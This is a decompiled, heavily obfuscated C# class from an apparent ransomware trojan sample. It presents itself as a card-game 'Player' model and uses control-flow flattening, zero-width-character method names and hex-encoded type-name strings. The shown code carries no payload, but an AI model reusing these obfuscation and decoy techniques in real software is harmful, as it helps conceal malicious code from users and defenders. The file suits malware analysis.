// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ILegacyEvidenceAdapt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C8AEC27-D027-41D5-B71C-E99019A8E594
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a42b3919356aa815980faeac0fc6222bd4a2d6f6cc5bdc01c5a5f55014a9c66e.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 39254821;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1318666463)) % 13U)
        {
          case 0:
            num1 = (int) num2 * -1964974190 ^ -875020086;
            continue;
          case 1:
            num1 = (int) num2 * -926531255 ^ -585161228;
            continue;
          case 2:
            int num3 = !flag ? 139233874 : (num3 = 1291830602);
            num1 = num3 ^ (int) num2 * 1731007682;
            continue;
          case 3:
            int num4;
            num1 = num4 = BaseStream == 1 ? 409571920 : (num4 = 1536713118);
            continue;
          case 4:
            str1 = (string) null;
            flag = BaseStream == 0;
            num1 = (int) num2 * -523017136 ^ -376335687;
            continue;
          case 5:
            str1 = "6A5633";
            num1 = (int) num2 * 1183152688 ^ -476257092;
            continue;
          case 7:
            num1 = (int) num2 * -65815622 ^ -146245595;
            continue;
          case 8:
            num1 = (int) num2 * -1474290804 ^ 271863111;
            continue;
          case 9:
            str2 = str1;
            num1 = 2106132518;
            continue;
          case 10:
            goto label_1;
          case 11:
            str1 = "57696E5254547970654E616D65436F6E76657274";
            num1 = (int) num2 * -850090587 ^ -1524068826;
            continue;
          case 12:
            num1 = (int) num2 * 1678744874 ^ -2050101824;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 373896570;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 876202999)) % 5U)
        {
          case 0:
            num1 = (int) num3 * -1503150611 ^ -1172929591;
            continue;
          case 1:
            if (this.PlanningCards.Length != 0)
            {
              num4 = this.PlanningCards[cardTypeIndex];
              break;
            }
            num1 = (int) num3 * -270198552 ^ 345192062;
            continue;
          case 2:
            num4 = 0;
            break;
          case 4:
            goto label_1;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 1556827560;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -1119871105;
        int[] planningCards;
        int index;
        int num2;
        bool flag;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -1347779526)) % 12U)
          {
            case 0:
              num1 = (int) num4 * 1376338876 ^ 1543052431;
              continue;
            case 1:
              flag = num2 > 0;
              num1 = (int) num4 * -297429175 ^ -627608713;
              continue;
            case 2:
              num1 = -2140439475;
              continue;
            case 3:
              ++num3;
              num1 = (int) num4 * -2002292595 ^ 154894495;
              continue;
            case 4:
              int num5 = flag ? 900272449 : (num5 = 1301835008);
              num1 = num5 ^ (int) num4 * 462137517;
              continue;
            case 5:
              num3 = 0;
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 285150406 ^ 1690550528;
              continue;
            case 6:
              num2 = planningCards[index];
              num1 = -516477977;
              continue;
            case 7:
              ++index;
              num1 = (int) num4 * -141079023 ^ 2014003224;
              continue;
            case 9:
              int num6;
              num1 = num6 = index < planningCards.Length ? -1439067496 : (num6 = -683047500);
              continue;
            case 10:
              planningCardsCount = num3;
              num1 = (int) num4 * -779660176 ^ -193830122;
              continue;
            case 11:
              goto label_1;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -21398604;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2055608611)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1310614824 ^ 761179966;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_11:
      int num1 = index < this.PlanningCards.Length ? 255511200 : (num1 = 1568848696);
      bool flag;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 992689007)) % 11U)
        {
          case 0:
            str1 = Player.\u202C‫⁯⁯‬‏‫⁪‪‎‏‪‪‍⁪‍⁪​‮⁪‮‏‬⁬‫⁪‎⁪‎‎‎‮‌‌‬⁮​⁪‌‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 825929741;
            continue;
          case 1:
            num1 = 30248916;
            continue;
          case 3:
            num1 = (int) num2 * 947742795 ^ -399588305;
            continue;
          case 4:
            goto label_11;
          case 5:
            str2 = str1;
            num1 = (int) num2 * 1177256108 ^ 138598141;
            continue;
          case 6:
            num1 = (int) num2 * -252615886 ^ 907048957;
            continue;
          case 7:
            planningCard = this.PlanningCards[index];
            flag = planningCard == 0;
            num1 = (int) num2 * 159283767 ^ 1104924791;
            continue;
          case 8:
            num1 = 255511200;
            continue;
          case 9:
            ++index;
            num1 = 757189701;
            continue;
          case 10:
            int num3 = !flag ? -747893833 : (num3 = -596758666);
            num1 = num3 ^ (int) num2 * 327629327;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 731000236;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 283887609)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 463981708 ^ -1966063575;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1134968701;
      int count;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2141838835)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * -843881896 ^ -739679779;
            continue;
          case 2:
            int num3;
            num1 = num3 = aIndex < count ? -477366268 : (num3 = -1426156048);
            continue;
          case 3:
            num1 = (int) num2 * 845742153 ^ -351186454;
            continue;
          case 5:
            ++aIndex;
            num1 = (int) num2 * 461760239 ^ 1910192494;
            continue;
          case 6:
            aIndex = 0;
            num1 = (int) num2 * -73239474 ^ 928804958;
            continue;
          case 7:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -2015978972;
            continue;
          case 8:
            count = json.Count;
            num1 = (int) num2 * 930363920 ^ 1979022654;
            continue;
          case 9:
            numArray = new int[count];
            num1 = (int) num2 * -1747039585 ^ 204096036;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString() => Player.\u200B⁯⁯‭‫‪​⁪‬‌‪‮‍‍⁮‫⁮⁭⁪⁭‍‌⁭​‌‪‫‫⁬⁭⁭​‎‏‬⁫⁮‮‪⁮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u202C‫⁯⁯‬‏‫⁪‪‎‏‪‪‍⁪‍⁪​‮⁪‮‏‬⁬‫⁪‎⁪‎‎‎‮‌‌‬⁮​⁪‌‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200B⁯⁯‭‫‪​⁪‬‌‪‮‍‍⁮‫⁮⁭⁪⁭‍‌⁭​‌‪‫‫⁬⁭⁭​‎‏‬⁫⁮‮‪⁮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
